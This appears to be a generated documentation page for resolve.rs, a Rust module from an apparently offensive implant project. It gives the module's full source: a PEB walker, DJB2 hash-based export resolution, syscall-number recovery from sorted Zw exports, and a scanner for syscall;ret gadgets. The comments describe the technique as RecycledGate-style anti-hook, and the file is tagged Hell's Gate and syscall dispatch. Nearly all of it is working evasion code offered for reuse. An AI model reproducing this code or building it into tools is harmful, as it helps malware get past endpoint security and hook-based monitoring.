# crowd — resolve.rs  (⚡ GOD TIER)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/resolve.rs` |
| **Lines** | 572 |
| **Tier** | S |
| **Cards** | T003-hells-gate, T004-syscall-dispatch |
| **Role** | PEB walker + DJB2 hash resolution |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 15 |

## Purpose

# crowd — resolve.rs  (⚡ GOD TIER)

PEB walker, DJB2 hasher, and RecycledGate syscall stub scanner.
Copied verbatim from killaofking/crates/core/src/sys_resolve.rs
with the `pub(crate)` visibility widened to `pub` for use across modules.

## Constants

- `MAX_SCAN`: `isize` = `512`
- `MAX_SCAN`: `isize` = `512`

## Types

### struct `ListEntry` (line 38)

### struct `UnicodeString` (line 45)

### struct `LdrDataTableEntry` (line 53)

### struct `PebLdrData` (line 69)

### struct `Peb` (line 77)

### struct `ListEntry32` (line 241)

### struct `UnicodeString32` (line 248)

### struct `ImageExportDirectory` (line 315)

## Public API

### `djb2_hash` (line 16)
```rust
pub fn djb2_hash(bytes: &[u8]) -> u32
```

### `compute_hash` (line 25)
```rust
pub fn compute_hash(function_name: &str) -> u32
```

### `ntdll_base_and_name_hashes` (line 99)
```rust
pub fn ntdll_base_and_name_hashes() -> (*const u8, u32)
```

### `find_module_base` (line 137)
```rust
pub fn find_module_base(module_name: &str) -> *const u8
```

### `resolve_export_by_name` `unsafe` (line 172)
```rust
pub unsafe fn resolve_export_by_name(base: *const u8, export_name: &str) -> *const u8
```
Resolve an export address by name from any loaded module base.
Uses the PE export directory walker (same as etw.rs resolve_export_by_hash).
Returns the function VA, or null if not found.

### `resolve_export_by_ordinal` `unsafe` (line 211)
```rust
pub unsafe fn resolve_export_by_ordinal(base: *const u8, ordinal: u16) -> *const u8
```
Resolve an export address by ordinal from any loaded module base.
Uses the PE export directory. The ordinal is the raw value from the import
table (biased — the caller must subtract OrdinalBase if needed, but for
imports via IMAGE_ORDINAL_FLAG the low 16 bits are already the biased ordinal).
Returns the function VA, or null if not found.

### `ntdll_base_and_name_hashes` (line 274)
```rust
pub fn ntdll_base_and_name_hashes() -> (*const u8, u32)
```

### `resolve_ssn` (line 537)
```rust
pub fn resolve_ssn(name: &str) -> (u32, usize)
```

### `resolve_ssn_by_hash` (line 541)
```rust
pub fn resolve_ssn_by_hash(target_hash: u32) -> (u32, usize)
```

## Internal Functions

- `gs_read_u64` (unsafe) (line 87)
- `fs_read_u32` (unsafe) (line 256)
- `is_wow64` (line 269)
- `resolve_export_ssn` (unsafe) (line 329)
- `find_syscall_stub64` (unsafe) (line 428)
- `matches_stub64` (unsafe) (line 487)
- `find_syscall_stub32` (unsafe) (line 495)
- `matches_stub32` (unsafe) (line 523)
- `within_image` (line 567)

## Full Source

```rust
//! # crowd — resolve.rs  (⚡ GOD TIER)
//!
//! PEB walker, DJB2 hasher, and RecycledGate syscall stub scanner.
//! Copied verbatim from killaofking/crates/core/src/sys_resolve.rs
//! with the `pub(crate)` visibility widened to `pub` for use across modules.

#![allow(dead_code)]
#[cfg(target_arch = "x86_64")]
use std::ptr::addr_of;
use std::vec::Vec;

// Minimal resolver inspired by RecycledGate: hash export name (djb2 over bytes),
// read SSN from NTDLL export thunk, and return a pointer to the syscall stub.

#[inline(always)]
pub fn djb2_hash(bytes: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for b in bytes {
        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(*b as u32);
    }
    hash
}

#[inline(always)]
pub fn compute_hash(function_name: &str) -> u32 {
    let mut hash: u32 = 5381;
    for byte in function_name.as_bytes() {
        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(*byte as u32);
    }
    hash
}

// ─────────────────────────────────────────────────────
// 64-bit PEB / LDR structures
// ─────────────────────────────────────────────────────
#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *const u16,
}

#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct LdrDataTableEntry {
    reserved1: [*const u8; 2],
    in_memory_order_links: ListEntry,
    reserved2: [*const u8; 2],
    dll_base: *const u8,
    reserved3: [*const u8; 2],
    full_dll_name: UnicodeString,
    base_dll_name: UnicodeString,
    reserved4: [u8; 8],
    reserved5: [*const u8; 3],
    checksum: u32,
    time_date_stamp: u32,
}

#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct PebLdrData {
    reserved1: [u8; 8],
    reserved2: [*const u8; 3],
    in_memory_order_module_list: ListEntry,
}

#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct Peb {
    reserved1: [u8; 2],
    being_debugged: u8,
    reserved2: u8,
    reserved3: [*const u8; 2],
    ldr: *const PebLdrData,
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
unsafe fn gs_read_u64(offset: u32) -> u64 {
    let out: u64;
    core::arch::asm!(
        "mov {}, gs:[{:e}]",
        lateout(reg) out,
        in(reg) offset,
        options(nostack, readonly, pure)
    );
    out
}

#[cfg(target_arch = "x86_64")]
pub fn ntdll_base_and_name_hashes() -> (*const u8, u32) {
    unsafe {
        let peb = gs_read_u64(0x60) as *const Peb;
        if peb.is_null() {
            return (core::ptr::null(), 0);
        }
        let target_hash = djb2_hash(b"ntdll.dll");
        let ldr = (*peb).ldr;
        if ldr.is_null() {
            return (core::ptr::null(), 0);
        }
        let mut e = (*ldr).in_memory_order_module_list.flink;
        let head = addr_of!((*ldr).in_memory_order_module_list) as *const ListEntry;
        while e as *const _ != head {
            let entry = (e as *const u8).sub(core::mem::size_of::<[*const u8; 2]>())
                as *const LdrDataTableEntry;
            let base = (*entry).dll_base;
            let name = &(*entry).base_dll_name;
            let len = (name.length / 2) as usize;
            let slice = core::slice::from_raw_parts(name.buffer, len);
            let mut bytes = Vec::with_capacity(len);
            for c in slice {
                bytes.push((*c | 0x20) as u8);
            }
            let h = djb2_hash(&bytes);
            if h == target_hash {
                return (base, h);
            }
            e = (*e).flink;
        }
        (core::ptr::null(), 0)
    }
}

/// Generic PEB module walker: find any loaded module by name (case-insensitive).
/// Returns the module base address, or null if not found.
/// Uses the same InMemoryOrderModuleList traversal as ntdll_base_and_name_hashes.
#[cfg(target_arch = "x86_64")]
pub fn find_module_base(module_name: &str) -> *const u8 {
    let target_hash = {
        let lower: Vec<u8> = module_name.bytes().map(|b| b | 0x20).collect();
        djb2_hash(&lower)
    };
    unsafe {
        let peb = gs_read_u64(0x60) as *const Peb;
        if peb.is_null() { return core::ptr::null(); }
        let ldr = (*peb).ldr;
        if ldr.is_null() { return core::ptr::null(); }
        let mut e = (*ldr).in_memory_order_module_list.flink;
        let head = addr_of!((*ldr).in_memory_order_module_list) as *const ListEntry;
        while e as *const _ != head {
            let entry = (e as *const u8).sub(core::mem::size_of::<[*const u8; 2]>())
                as *const LdrDataTableEntry;
            let base = (*entry).dll_base;
            let name = &(*entry).base_dll_name;
            let len = (name.length / 2) as usize;
            let slice = core::slice::from_raw_parts(name.buffer, len);
            let mut bytes = Vec::with_capacity(len);
            for c in slice {
                bytes.push((*c | 0x20) as u8);
            }
            if djb2_hash(&bytes) == target_hash {
                return base;
            }
            e = (*e).flink;
        }
        core::ptr::null()
    }
}

/// Resolve an export address by name from any loaded module base.
/// Uses the PE export directory walker (same as etw.rs resolve_export_by_hash).
/// Returns the function VA, or null if not found.
pub unsafe fn resolve_export_by_name(base: *const u8, export_name: &str) -> *const u8 {
    if base.is_null() { return core::ptr::null(); }
    if *(base as *const u16) != 0x5A4D { return core::ptr::null(); }
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    let nt = base.add(e_lfanew);
    let export_rva = *(nt.add(0x88) as *const u32) as usize; // DataDirectory[0]
    let export_size = *(nt.add(0x8C) as *const u32) as usize; // DataDirectory[0].Size
    if export_rva == 0 { return core::ptr::null(); }
    let exp = base.add(export_rva) as *const ImageExportDirectory;
    let n_names = (*exp).number_of_names as usize;
    let names = base.add((*exp).address_of_names as usize) as *const u32;
    let ords  = base.add((*exp).address_of_name_ordinals as usize) as *const u16;
    let funcs = base.add((*exp).address_of_functions as usize) as *const u32;

    let target_bytes = export_name.as_bytes();
    for i in 0..n_names {
        let name_rva = *names.add(i) as usize;
        let cstr = base.add(name_rva);
        let mut len = 0usize;
        while *cstr.add(len) != 0 { len += 1; }
        let slice = core::slice::from_raw_parts(cstr, len);
        if slice == target_bytes {
            let ord = *ords.add(i) as usize;
            let rva = *funcs.add(ord) as usize;
            // Forwarded export: RVA falls within the export directory itself
            if rva >= export_rva && rva < export_rva + export_size {
                return core::ptr::null();
            }
            return base.add(rva);
        }
    }
    core::ptr::null()
}

/// Resolve an export address by ordinal from any loaded module base.
/// Uses the PE export directory. The ordinal is the raw value from the import
/// table (biased — the caller must subtract OrdinalBase if needed, but for
/// imports via IMAGE_ORDINAL_FLAG the low 16 bits are already the biased ordinal).
/// Returns the function VA, or null if not found.
pub unsafe fn resolve_export_by_ordinal(base: *const u8, ordinal: u16) -> *const u8 {
    if base.is_null() { return core::ptr::null(); }
    if *(base as *const u16) != 0x5A4D { return core::ptr::null(); }
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    let nt = base.add(e_lfanew);
    let export_rva = *(nt.add(0x88) as *const u32) as usize;
    let export_size = *(nt.add(0x8C) as *const u32) as usize;
    if export_rva == 0 { return core::ptr::null(); }
    let exp = base.add(export_rva) as *const ImageExportDirectory;
    let n_funcs = (*exp).number_of_functions as usize;
    let ordinal_base = (*exp).base;
    let funcs = base.add((*exp).address_of_functions as usize) as *const u32;

    let idx = ordinal as u32;
    let unbiased = if idx >= ordinal_base { idx - ordinal_base } else { idx } as usize;
    if unbiased >= n_funcs { return core::ptr::null(); }
    let rva = *funcs.add(unbiased) as usize;
    if rva == 0 { return core::ptr::null(); }
    // Forwarded export check
    if rva >= export_rva && rva < export_rva + export_size {
        return core::ptr::null();
    }
    base.add(rva)
}

// ─────────────────────────────────────────────────────
// 32-bit PEB / LDR structures
// ─────────────────────────────────────────────────────
#[cfg(target_arch = "x86")]
#[repr(C)]
struct ListEntry32 {
    flink: *mut ListEntry32,
    blink: *mut ListEntry32,
}

#[cfg(target_arch = "x86")]
#[repr(C)]
struct UnicodeString32 {
    length: u16,
    maximum_length: u16,
    buffer: *const u16,
}

#[cfg(target_arch = "x86")]
#[inline(always)]
unsafe fn fs_read_u32(offset: u32) -> u32 {
    let out: u32;
    core::arch::asm!(
        "mov {0:e}, fs:[{1}]",
        out(reg) out,
        in(reg) offset,
        options(nostack, readonly, pure)
    );
    out
}

#[cfg(target_arch = "x86")]
#[inline(always)]
fn is_wow64() -> bool {
    unsafe { fs_read_u32(0xC0) != 0 }
}

#[cfg(target_arch = "x86")]
pub fn ntdll_base_and_name_hashes() -> (*const u8, u32) {
    unsafe {
        let peb = fs_read_u32(0x30) as *const u8;
        if peb.is_null() {
            return (core::ptr::null(), 0);
        }
        let ldr = *(peb.add(0x0C) as *const *const u8);
        if ldr.is_null() {
            return (core::ptr::null(), 0);
        }
        let list = ldr.add(0x14) as *const ListEntry32;
        let mut e = (*list).flink;
        let head = list;
        while e as *const _ != head as *const _ {
            let entry = (e as *const u8).sub(0x08);
            let dll_base = *(entry.add(0x18) as *const *const u8);
            let name = entry.add(0x2C) as *const UnicodeString32;
            let len = ((*name).length / 2) as usize;
            if len == 0 {
                e = (*e).flink;
                continue;
            }
            let slice = core::slice::from_raw_parts((*name).buffer, len);
            let mut bytes = Vec::with_capacity(len);
            for c in slice {
                bytes.push(((*c | 0x20) as u8));
            }
            let h = djb2_hash(&bytes);
            if h == djb2_hash(b"ntdll.dll") {
                return (dll_base, h);
            }
            e = (*e).flink;
        }
        (core::ptr::null(), 0)
    }
}

// ─────────────────────────────────────────────────────
// Shared export walking logic
// ─────────────────────────────────────────────────────
#[repr(C)]
struct ImageExportDirectory {
    characteristics: u32,
    time_date_stamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

unsafe fn resolve_export_ssn<F>(
    ntdll: *const u8,
    target_hash: u32,
    export_dir_offset: usize,
    mut _ssn_and_gate: F,
) -> (u32, usize)
where
    F: FnMut(*const u8, *const u8, *const u8) -> (u32, usize),
{
    if ntdll.is_null() {
        return (0, 0);
    }
    if *(ntdll as *const u16) != 0x5A4D {
        return (0, 0);
    }
    let e_lfanew = *(ntdll.add(0x3C) as *const u32) as usize;
    let nt_headers = ntdll.add(e_lfanew);
    let size_of_image = *(nt_headers.add(0x50) as *const u32) as usize;
    if size_of_image == 0 {
        return (0, 0);
    }
    let image_end = ntdll.add(size_of_image);
    let export_dir_rva = *(nt_headers.add(export_dir_offset) as *const u32) as usize;
    if export_dir_rva == 0 {
        return (0, 0);
    }
    let exp = ntdll.add(export_dir_rva) as *const ImageExportDirectory;
    let names = ntdll.add((*exp).address_of_names as usize) as *const u32;
    let ords = ntdll.add((*exp).address_of_name_ordinals as usize) as *const u16;
    let funcs = ntdll.add((*exp).address_of_functions as usize) as *const u32;

    let mut target_func_rva = 0;
    let mut zw_funcs = std::vec::Vec::new();

    for i in 0..(*exp).number_of_names {
        let name_rva = *names.add(i as usize) as usize;
        let cstr = ntdll.add(name_rva) as *const u8;
        let mut len = 0usize;
        while *cstr.add(len) != 0 {
            len += 1;
        }
        let slice = core::slice::from_raw_parts(cstr, len);
        
        let ordinal = *ords.add(i as usize) as usize;
        let func_rva = *funcs.add(ordinal) as usize;

        if djb2_hash(slice) == target_hash {
            target_func_rva = func_rva;
        }

        if len >= 2 && slice[0] == b'Z' && slice[1] == b'w' {
            zw_funcs.push(func_rva);
        }
    }

    if target_func_rva == 0 {
        return (0, 0);
    }

    zw_funcs.sort_unstable();

    let mut ssn = 0;
    for (i, &rva) in zw_funcs.iter().enumerate() {
        if rva == target_func_rva {
            ssn = i as u32;
            break;
        }
    }

    let mut gadget = 0usize;
    let target_ptr = ntdll.add(target_func_rva);
    
    for off in 0..512 {
        let p = target_ptr.wrapping_add(off);
        if within_image(p, 3, ntdll, image_end)
            && *p == 0x0F && *p.add(1) == 0x05 && *p.add(2) == 0xC3
        {
            gadget = p as usize;
            break;
        }
    }

    if gadget == 0 && !zw_funcs.is_empty() {
        let alt_ptr = ntdll.add(zw_funcs[0]);
        for off in 0..512 {
            let p = alt_ptr.wrapping_add(off);
            if within_image(p, 3, ntdll, image_end)
                && *p == 0x0F && *p.add(1) == 0x05 && *p.add(2) == 0xC3
            {
                gadget = p as usize;
                break;
            }
        }
    }

    (ssn, gadget)
}

#[cfg(target_arch = "x86_64")]
unsafe fn find_syscall_stub64(
    func: *const u8,
    image_start: *const u8,
    image_end: *const u8,
) -> (u32, usize) {
    // RecycledGate-style anti-hook: scan nearby for the canonical stub
    const MAX_SCAN: isize = 512;
    for delta in 0..=MAX_SCAN {
        let forward = func.offset(delta);
        if within_image(forward, 4, image_start, image_end) && matches_stub64(forward) {
            let ssn = *((forward as usize + 4) as *const u16) as u32;
            // gadget = address of the SYSCALL byte (0x0F 0x05) inside ntdll
            // Standard uninstrumented stub layout (18 bytes):
            //   +0  4C 8B D1     mov r10, rcx
            //   +3  B8 xx xx 00  mov eax, SSN
            //   +7  (F6 04 25 …) [optional test byte on Win11]
            //   +18 0F 05        syscall
            //   +20 C3           ret
            // The exact offset of 0F 05 is 0x12 (Win10) or 0x14 (Win11 variant).
            // Scan forward up to 32 bytes for 0F 05 C3 to handle both.
            let mut gadget = 0usize;
            for off in 0isize..32 {
                let p = forward.offset(off);
                if within_image(p, 3, image_start, image_end)
                    && *p == 0x0F && *p.add(1) == 0x05 && *p.add(2) == 0xC3
                {
                    gadget = p as usize;
                    break;
                }
            }
            if gadget != 0 {
                return (ssn, gadget);
            }
        }
        if delta > 0 {
            let back = func.offset(-delta);
            if within_image(back, 4, image_start, image_end) && matches_stub64(back) {
                let ssn = *((back as usize + 4) as *const u16) as u32;
                let mut gadget = 0usize;
                for off in 0isize..32 {
                    let p = back.offset(off);
                    if within_image(p, 3, image_start, image_end)
                        && *p == 0x0F && *p.add(1) == 0x05 && *p.add(2) == 0xC3
                    {
                        gadget = p as usize;
                        break;
                    }
                }
                if gadget != 0 {
                    return (ssn, gadget);
                }
            }
        }
    }
    (0, 0)
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
unsafe fn matches_stub64(p: *const u8) -> bool {
    if ((p as usize & 0xFFF) + 4) > 0x1000 {
        return false;
    }
    *p == 0x4c && *p.add(1) == 0x8b && *p.add(2) == 0xd1 && *p.add(3) == 0xb8
}

#[cfg(target_arch = "x86")]
unsafe fn find_syscall_stub32(
    func: *const u8,
    wow64: bool,
    image_start: *const u8,
    image_end: *const u8,
) -> (u32, usize) {
    const MAX_SCAN: isize = 512;
    for delta in 0..=MAX_SCAN {
        let forward = func.offset(delta);
        if within_image(forward, 7, image_start, image_end) && matches_stub32(forward, wow64) {
            let ssn = *((forward.add(1)) as *const u32);
            let gate = forward as usize + if wow64 { 0x0A } else { 0x0F };
            return (ssn, gate);
        }
        if delta > 0 {
            let back = func.offset(-delta);
            if within_image(back, 7, image_start, image_end) && matches_stub32(back, wow64) {
                let ssn = *((back.add(1)) as *const u32);
                let gate = back as usize + if wow64 { 0x0A } else { 0x0F };
                return (ssn, gate);
            }
        }
    }
    (0, 0)
}

#[cfg(target_arch = "x86")]
#[inline(always)]
unsafe fn matches_stub32(p: *const u8, wow64: bool) -> bool {
    if ((p as usize & 0xFFF) + 7) > 0x1000 {
        return false;
    }
    if *p != 0xB8 {
        return false;
    }
    if wow64 {
        *p.add(5) == 0x33 && *p.add(6) == 0xC9
    } else {
        *p.add(5) == 0xBA
    }
}

pub fn resolve_ssn(name: &str) -> (u32, usize) {
    resolve_ssn_by_hash(djb2_hash(name.as_bytes()))
}

pub fn resolve_ssn_by_hash(target_hash: u32) -> (u32, usize) {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        let (ntdll, _) = ntdll_base_and_name_hashes();
        return resolve_export_ssn(ntdll, target_hash, 0x88, |func, start, end| {
            find_syscall_stub64(func, start, end)
        });
    }

    #[cfg(target_arch = "x86")]
    unsafe {
        let (ntdll, _) = ntdll_base_and_name_hashes();
        let wow64 = is_wow64();
        return resolve_export_ssn(ntdll, target_hash, 0x78, |func, start, end| {
            find_syscall_stub32(func, wow64, start, end)
        });
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "x86")))]
    {
        let _ = target_hash;
        (0, 0)
    }
}

#[inline(always)]
fn within_image(p: *const u8, len: usize, start: *const u8, end: *const u8) -> bool {
    let p = p as usize;
    let start = start as usize;
    let end = end as usize;
    p >= start && p.saturating_add(len) <= end
}

```